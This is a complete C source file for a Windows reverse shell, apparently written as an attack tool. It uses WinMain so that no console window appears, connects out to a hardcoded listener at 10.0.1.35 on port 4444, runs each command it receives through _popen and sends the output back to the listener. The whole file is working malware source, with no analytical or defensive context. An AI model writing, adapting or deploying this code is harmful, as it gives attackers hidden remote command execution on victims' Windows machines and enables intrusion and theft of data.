#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <process.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib

void error_exit(const char *message) {
    // Error handling function (not visible in console)
    exit(EXIT_FAILURE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsa;
    SOCKET client_socket;
    struct sockaddr_in server;
    char server_ip[16] = "10.0.1.35";  // IP of the listener (server)
    int server_port = 4444;
    char buffer[1024];
    FILE *fp;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        error_exit("Failed to initialize Winsock.");
    }

    // Create socket
    if ((client_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        error_exit("Could not create socket.");
    }

    // Configure server address
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(server_port);

    // Connect to the server
    if (connect(client_socket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        error_exit("Connection failed.");
    }

    // Receive commands from the server and execute them
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int recv_size = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (recv_size == SOCKET_ERROR || recv_size == 0) {
            break;  // Connection lost
        }

        // Execute the received command
        fp = _popen(buffer, "r");
        if (fp != NULL) {
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                send(client_socket, buffer, strlen(buffer), 0);  // Send output back to server
            }
            _pclose(fp);
        }
    }

    // Cleanup
    closesocket(client_socket);
    WSACleanup();

    return 0;
}
